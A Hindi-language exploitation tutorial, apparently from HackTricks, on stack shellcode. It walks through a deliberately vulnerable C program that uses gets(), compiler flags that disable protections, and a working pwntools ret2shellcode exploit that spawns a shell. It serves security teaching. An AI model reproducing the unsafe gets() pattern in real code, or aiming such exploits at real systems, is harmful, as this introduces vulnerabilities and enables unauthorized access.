# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

**Stack shellcode** एक तकनीक है जो बाइनरी शोषण में उपयोग की जाती है जहाँ एक हमलावर एक कमजोर प्रोग्राम के स्टैक पर शेलकोड लिखता है और फिर **Instruction Pointer (IP)** या **Extended Instruction Pointer (EIP)** को इस शेलकोड के स्थान की ओर इंगित करने के लिए संशोधित करता है, जिससे यह निष्पादित होता है। यह एक क्लासिक विधि है जिसका उपयोग अनधिकृत पहुंच प्राप्त करने या लक्षित प्रणाली पर मनमाने आदेशों को निष्पादित करने के लिए किया जाता है। यहाँ प्रक्रिया का एक विवरण है, जिसमें एक सरल C उदाहरण और यह कैसे आप **pwntools** के साथ एक संबंधित शोषण लिख सकते हैं।

### C Example: A Vulnerable Program

चलो एक कमजोर C प्रोग्राम के सरल उदाहरण से शुरू करते हैं:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
यह प्रोग्राम `gets()` फ़ंक्शन के उपयोग के कारण बफ़र ओवरफ़्लो के लिए संवेदनशील है।

### संकलन

इस प्रोग्राम को संकलित करने के लिए जबकि विभिन्न सुरक्षा उपायों को निष्क्रिय किया गया है (संवेदनशील वातावरण का अनुकरण करने के लिए), आप निम्नलिखित कमांड का उपयोग कर सकते हैं:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: स्टैक सुरक्षा को अक्षम करता है।
- `-z execstack`: स्टैक को निष्पादन योग्य बनाता है, जो स्टैक पर संग्रहीत शेलकोड को निष्पादित करने के लिए आवश्यक है।
- `-no-pie`: पोजीशन इंडिपेंडेंट एक्सीक्यूटेबल को अक्षम करता है, जिससे यह अनुमान लगाना आसान हो जाता है कि हमारा शेलकोड किस मेमोरी पते पर होगा।
- `-m32`: प्रोग्राम को 32-बिट एक्सीक्यूटेबल के रूप में संकलित करता है, जो अक्सर शोषण विकास में सरलता के लिए उपयोग किया जाता है।

### Python Exploit using Pwntools

यहां बताया गया है कि आप **pwntools** का उपयोग करके **ret2shellcode** हमले को करने के लिए Python में एक शोषण कैसे लिख सकते हैं:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
यह स्क्रिप्ट एक पेलोड बनाती है जिसमें **NOP स्लाइड**, **शेलकोड** शामिल होता है, और फिर **EIP** को NOP स्लाइड की ओर इशारा करने वाले पते से ओवरराइट करती है, यह सुनिश्चित करते हुए कि शेलकोड निष्पादित हो जाए।

**NOP स्लाइड** (`asm('nop')`) का उपयोग इस संभावना को बढ़ाने के लिए किया जाता है कि निष्पादन हमारे शेलकोड में "स्लाइड" करेगा चाहे सटीक पता कुछ भी हो। `p32()` तर्क को अपने बफर के प्रारंभिक पते के साथ एक ऑफसेट जोड़कर NOP स्लाइड में लैंड करने के लिए समायोजित करें।

## सुरक्षा

- [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **को बंद किया जाना चाहिए** ताकि पता निष्पादन के दौरान विश्वसनीय हो या जिस पते पर फ़ंक्शन संग्रहीत होगा वह हमेशा एक जैसा नहीं होगा और आपको यह पता लगाने के लिए कुछ लीक की आवश्यकता होगी कि जीत फ़ंक्शन कहाँ लोड हुआ है।
- [**स्टैक कैनरीज़**](../common-binary-protections-and-bypasses/stack-canaries/) को भी बंद किया जाना चाहिए या समझौता किया गया EIP रिटर्न पता कभी नहीं फॉलो किया जाएगा।
- [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md) **स्टैक** सुरक्षा शेलकोड के स्टैक के अंदर निष्पादन को रोक देगी क्योंकि वह क्षेत्र निष्पादन योग्य नहीं होगा।

## अन्य उदाहरण और संदर्भ

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64बिट, ASLR के साथ स्टैक पता लीक, शेलकोड लिखें और उस पर कूदें
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 बिट, ASLR के साथ स्टैक लीक, शेलकोड लिखें और उस पर कूदें
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 बिट, ASLR के साथ स्टैक लीक, exit() को कॉल करने से रोकने के लिए तुलना, एक मान के साथ चर को ओवरराइट करें और शेलकोड लिखें और उस पर कूदें

{{#include ../../../banners/hacktricks-training.md}}
